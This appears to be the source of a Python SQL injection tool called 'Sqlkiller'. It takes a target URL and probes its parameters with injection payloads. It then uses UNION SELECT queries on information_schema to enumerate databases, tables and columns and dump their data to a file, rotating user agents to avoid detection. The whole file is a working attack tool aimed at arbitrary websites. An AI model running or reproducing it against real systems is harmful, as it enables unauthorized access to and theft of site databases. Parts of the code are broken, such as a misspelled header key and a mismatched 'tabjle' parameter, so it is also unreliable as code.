import requests
import sys
import time
import urllib.parse
import random
from modules.payloads  import payloads # Ensure this file contains a list of payloads
from modules.uagent import user_agents  # Import the user_agents list


# Define the logo
logo = """
  ____        _ _    _ _ _           
 / ___|  __ _| | | _(_) | | ___ _ __ 
 \___ \ / _` | | |/ / | | |/ _ \ '__|
  ___) | (_| | |   <| | | |  __/ |   
 |____/ \__, |_|_|\_\_|_|_|\___|_|   
           |_|                       

                              v01

by MrpasswordTz
"""

# Color codes for terminal output
RED = "\033[91m"    # Critical vulnerability
GREEN = "\033[92m"  # Medium vulnerability
BLUE = "\033[94m"   # For specific keywords
WHITE = "\033[0m"   # Default color
LIGHT_BLUE = "\033[96m" #logo color


# Global variable to store results
results = []

# Define the user input function
def get_input():
    url = input("Enter the target website URL: ")
    return url

# Extract parameters from the URL
def extract_parameters(url):
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    return list(query_params.keys())

# Check device connectivity
def check_connectivity(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            print("[+] Website is reachable.")
        else:
            print("[-] Website is not reachable. Exiting.")
            sys.exit(0)
    except requests.exceptions.RequestException:
        print("[-] Website is not reachable. Exiting.")
        sys.exit(0)

# Function to set a random user agent
def set_random_user_agent():
    headers = {
        'User -Agent': random.choice(user_agents)
    }
    return headers

# Check if website is injectable
def check_injectable(url, param):
    try:
        headers = set_random_user_agent()
        response = requests.get(f"{url}&{param}=' OR 1=1 --", headers=headers)
        if "error" not in response.text.lower() and "mysql" in response.text.lower():
            print(f"[+] Parameter '{param}' is potentially injectable.")
            return True
        else:
            print(f"[-] Parameter '{param}' is not injectable.")
            return False
    except requests.exceptions.RequestException:
        print("[-] Error occurred while checking injectability. Exiting.")
        sys.exit(0)

# Function to extract database names
def get_databases(url):
    print("[*] Extracting database names...")
    databases = []
    for i in range(0, 10):  # Adjust range as needed
        payload = f"' UNION SELECT NULL, database() LIMIT 1 OFFSET {i} --"
        headers = set_random_user_agent()
        response = requests.get(url + payload, headers=headers)
        if "error" not in response.text.lower() and " database" in response.text.lower():
            databases.append(response.text.strip())  # Adjust based on actual response
            print(f"{BLUE}[+] Database found: {response.text.strip()}{WHITE}")
            time.sleep(1)  # Throttle requests
    return databases

# Function to extract table names
def get_tables(url, database):
    print(f"[*] Extracting tables from database: {database}...")
    tables = []
    for i in range(0, 10):  # Adjust range as needed
        payload = f"' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = '{database}' LIMIT 1 OFFSET {i} --"
        headers = set_random_user_agent()
        response = requests.get(url + payload, headers=headers)
        if "error" not in response.text.lower() and "table" in response.text.lower():
            tables.append(response.text.strip())  # Adjust based on actual response
            print(f"{BLUE}[+] Table found: {response.text.strip()}{WHITE}")
            time.sleep(1)  # Throttle requests
    return tables

# Function to extract column names
def get_columns(url, database, table):
    print(f"[*] Extracting columns from table: {table} in database: {database}...")
    columns = []
    for i in range(0, 10):  # Adjust range as needed
        payload = f"' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_schema = '{database}' AND table_name = '{table}' LIMIT 1 OFFSET {i} --"
        headers = set_random_user_agent()
        response = requests.get(url + payload, headers=headers)
        if "error" not in response.text.lower() and "column" in response.text.lower():
            columns.append(response.text.strip())  # Adjust based on actual response
            print(f"{BLUE}[+] Column found: {response.text.strip()}{WHITE}")
            time.sleep(1)  # Throttle requests
    return columns 

# Function to dump data from a table
def dump_data(url, database, tabjle):
    print(f"[*] Dumping data from table: {table} in database: {database}...")
    data = []
    for i in range(0, 10):  # Adjust range as needed
        payload = f"' UNION SELECT NULL, * FROM {table} LIMIT 1 OFFSET {i} --"
        headers = set_random_user_agent()
        response = requests.get(url + payload, headers=headers)
        if "error" not in response.text.lower():
            data.append(response.text.strip())  # Adjust based on actual response
            print(f"[+] Data: {response.text.strip()}")
            time.sleep(1)  # Throttle requests
    return data

# Function to test injection payloads one by one with fallback methods
def test_injection(url, param):
    print(f"[*] Testing injection for parameter: {param}...")
    found_vulnerabilities = []

    for payload in payloads:
        obfuscated_payload = f"{payload}/*"
        try:
            headers = set_random_user_agent()
            response = requests.get(f"{url}&{param}={obfuscated_payload}", headers=headers)
            if "error" not in response.text.lower():
                print(f"{GREEN}[+] Vulnerability found: {param} with payload: {payload}{WHITE}")
                found_vulnerabilities.append((param, payload))
                databases = get_databases(url)
                for database in databases:
                    tables = get_tables(url, database)
                    for table in tables:
                        columns = get_columns(url, database, table)
                        data = dump_data(url, database, table)
                        results.append(f"Database: {database}, Table: {table}, Columns: {columns}, Data: {data}")
                print(f"{RED}[!] Critical vulnerability found! Stopping further execution.{WHITE}")
                break  # Stop after finding the first vulnerability
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")

    return found_vulnerabilities

# Function to save results to a file
def save_results():
    with open("results.txt", "w") as f:
        for result in results:
            f.write(result + "\n")
    print("[+] Results saved to results.txt")

# Main function
def main():
    print(LIGHT_BLUE + logo + WHITE)
    
    url = get_input()
    check_connectivity(url)
    
    params = extract_parameters(url)
    
    if not params:
        print("[-] No parameters found in the URL.")
        sys.exit(0)

    all_vulnerabilities = []

    for param in params:
        if check_injectable(url, param):
            vulnerabilities = test_injection(url, param)
            all_vulnerabilities.extend(vulnerabilities)
            save_results()
        else:
            print(f"[-] No vulnerabilities found for parameter '{param}'.")

    # Summary of findings
    if all_vulnerabilities:
        print("\n[*] Summary of vulnerabilities found:")
        for param, payload in all_vulnerabilities:
            print(f" - Parameter: {param}, Payload: {payload}")
    else:
        print("[-] No vulnerabilities found.")

if __name__ == "__main__":
    main()